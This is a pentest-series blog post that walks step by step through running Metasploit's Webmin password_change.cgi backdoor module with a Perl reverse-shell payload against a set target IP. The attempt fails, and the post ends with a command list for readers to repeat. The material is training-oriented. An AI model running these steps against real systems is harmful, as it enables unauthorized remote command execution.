+++
title = 'Day 17 Remote Code Execution RCE : Webmin Case'
date = 2025-01-22T21:53:09+07:00
description = "Fail:RCE webmail, how to use msf6 step by step"
tags = [
    "information-gathering",
    "ethical-hacking",
    "Pentester-SERIES",
]
categories = [
    "cyber-security",
    "redteam",
    "Pentester-SERIES",
]
series = ["Themes Guide"]
aliases = ["hacking-series"]
image = "pentest1.png"
+++

### Step by step how to use Metasploitable, in remote code execution case

````````
┌──(kal┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole 

 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.


Would you like to use and setup a new database (recommended)? y
Running the 'init' command for the database:
Creating database at /home/kali/.msf4/db
Creating db socket file at /tmp
Starting database at /home/kali/.msf4/db...waiting for server to start....success
Creating database users
/opt/metasploit-framework/embedded/lib/ruby/gems/3.2.0/gems/pg-1.5.9/lib/pg/connection.rb:709:in `async_connect_or_reset': could not connect to server: Connection refused (PG::ConnectionBad)
        Is the server running on host "127.0.0.1" and accepting
        TCP/IP connections on port 5433?

        from /opt/metasploit-framework/embedded/lib/ruby/gems/3.2.0/gems/pg-1.5.9/lib/pg/connection.rb:844:in `connect_to_hosts'
        from /opt/metasploit-framework/embedded/lib/ruby/gems/3.2.0/gems/pg-1.5.9/lib/pg/connection.rb:772:in `new'
        from /opt/metasploit-framework/embedded/lib/ruby/gems/3.2.0/gems/pg-1.5.9/lib/pg.rb:63:in `connect'
        from /opt/metasploit-framework/embedded/framework/lib/msfdb_helpers/pg_ctl.rb:159:in `create_db_users'
        from /opt/metasploit-framework/embedded/framework/lib/msfdb_helpers/pg_ctl.rb:37:in `init'
        from msfdb:201:in `init_db'
        from msfdb:943:in `invoke_command'
        from msfdb:1072:in `<main>'

 ** Metasploit Framework Initial Setup Complete **

This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
 done
server started
Metasploit tip: Open an interactive Ruby terminal with irb
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f                                
EFLAGS: 00010046                                                                                              
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001                                                       
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60                                                       
ds: 0018   es: 0018  ss: 0018                                                                                 
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)                                                   
                                                                                                              
                                                                                                              
Stack: 90909090990909090990909090                                                                             
       90909090990909090990909090                                                                             
       90909090.90909090.90909090                                                                             
       90909090.90909090.90909090                                                                             
       90909090.90909090.09090900                                                                             
       90909090.90909090.09090900                                                                             
       ..........................                                                                             
       cccccccccccccccccccccccccc                                                                             
       cccccccccccccccccccccccccc                                                                             
       ccccccccc.................                                                                             
       cccccccccccccccccccccccccc                                                                             
       cccccccccccccccccccccccccc                                                                             
       .................ccccccccc                                                                             
       cccccccccccccccccccccccccc                                                                             
       cccccccccccccccccccccccccc                                                                             
       ..........................                                                                             
       ffffffffffffffffffffffffff                                                                             
       ffffffff..................                                                                             
       ffffffffffffffffffffffffff                                                                             
       ffffffff..................                                                                             
       ffffffff..................                                                                             
       ffffffff..................                                                                             
                                                                                                              

Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing                                                                                 


       =[ metasploit v6.4.44-dev-                         ]
+ -- --=[ 2484 exploits - 1280 auxiliary - 393 post       ]
+ -- --=[ 1463 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf6 > 10
[-] Unknown command: 10. Run the help command for more details.
msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf6 > 10
[-] Unknown command: 10. Run the help command for more details.
msf6 > 9
[-] Unknown command: 9. Run the help command for more details.
msf6 > use 10
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) > info

       Name: Webmin password_change.cgi Backdoor
     Module: exploit/linux/http/webmin_backdoor
   Platform: Unix, Linux
       Arch: cmd, x86, x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2019-08-10

Provided by:
  AkkuS
  wvu <wvu@metasploit.com>

Module side effects:
 ioc-in-logs
 artifacts-on-disk

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic (Unix In-Memory)
      1   Automatic (Linux Dropper)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                        ploit/basics/using-metasploit.html
  RPORT      10000            yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /                yes       Base path to Webmin
  URIPATH                     no        The URI to use for this exploit (default is random)
  VHOST                       no        HTTP server virtual host


  When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an addr
                                      ess on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT  8080             yes       The local port to listen on.

Payload information:

Description:
  This module exploits a backdoor in Webmin versions 1.890 through 1.920.
  Only the SourceForge downloads were backdoored, but they are listed as
  official downloads on the project's site.

  Unknown attacker(s) inserted Perl qx statements into the build server's
  source code on two separate occasions: once in April 2018, introducing
  the backdoor in the 1.890 release, and in July 2018, reintroducing the
  backdoor in releases 1.900 through 1.920.

  Only version 1.890 is exploitable in the default install. Later affected
  versions require the expired password changing feature to be enabled.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2019-15107
  http://www.webmin.com/exploit.html
  https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
  https://blog.firosolutions.com/exploits/webmin/
  https://github.com/webmin/webmin/issues/947


View the full module info with the info -d command.

msf6 exploit(linux/http/webmin_backdoor) > set RHOST 178.16.140.4
RHOST => 178.16.140.4
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => tun0
msf6 exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     178.16.140.4     yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                         sploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an add
                                       ress on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/webmin_backdoor) > run
[-] Msf::OptionValidateError One or more options failed to validate: LHOST.
[*] Exploit completed, but no session was created.i㉿kali)-[~/Downloads]


````````

### Important!!!
use command to run **msf6** step by step

``````
┌──(kal┌──(kali㉿kali)-[~/Downloads]
└─$ msfconsole 

msf6 > search webmin

msf6 > use 10

msf6 exploit(linux/http/webmin_backdoor) > set RHOST 178.16.140.4

msf6 exploit(linux/http/webmin_backdoor) > set SSL true

msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0

msf6 exploit(linux/http/webmin_backdoor) > show options

msf6 exploit(linux/http/webmin_backdoor) > run

```````

thank you :)